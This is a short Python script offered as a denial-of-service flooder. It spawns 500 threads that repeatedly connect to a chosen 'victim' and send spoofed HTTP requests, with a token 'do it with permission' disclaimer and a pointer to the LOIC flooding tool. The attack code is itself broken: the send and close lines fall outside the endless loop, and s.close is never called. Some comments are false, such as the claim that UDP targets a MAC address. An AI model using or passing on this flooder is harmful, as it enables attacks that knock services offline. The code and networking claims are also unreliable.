# can flood TCP / UDP / HTTP
# TCP - ip (ex - 192.158.1.38)
# UDP - mac address (ex - 00:1B:44:11:3A:B7) 
# HTTP - websites (example - http://randomwebsite.com)
# https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers


# DDOS/DOS - attacker attacks open ports with huge requests buffering and potentially taking down the server or protocol 
# if you use this with any malicious intent i'm not responsible.. do it with permission

import threading # multiple threads 
import socket # joins together networks 


victim = 'INSERT OWN IP / WEBSITE' # use your own IP or Website
# If TCP, HTTP - port 80
port = 80 # HTTP port
disguised_ip = 'INSERT RANDOM IP' 

if_connected = 0 

def attack(): 
    while True: 
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((victim, port))
    s.sendto(("GET /" + victim + " HTTP/1.1\r\n").encode('ascii'), (victim, port)) 
    s.sendto(("Host: " + disguised_ip + "\r\n\r\n").encode('ascii'), (victim, port)) 
    s.close
    # get victim, specify its HTTP version, encode via ascii, send to port 
    
    # REPEATS ITSELF.. connect, send, close... a neverending loop

    global if_connected
    if_connected += 1 
    if if_connected % 500 == 0: 
        print(if_connected)

for i in range(500): # 500 threads / packets. Can customize
    thread = threading.Thread(target=attack)
    thread.start()

# if you get a connection error, the port is most likely blocked

# https://sourceforge.net/projects/loic/ for a helpful tool if you decide to use it 
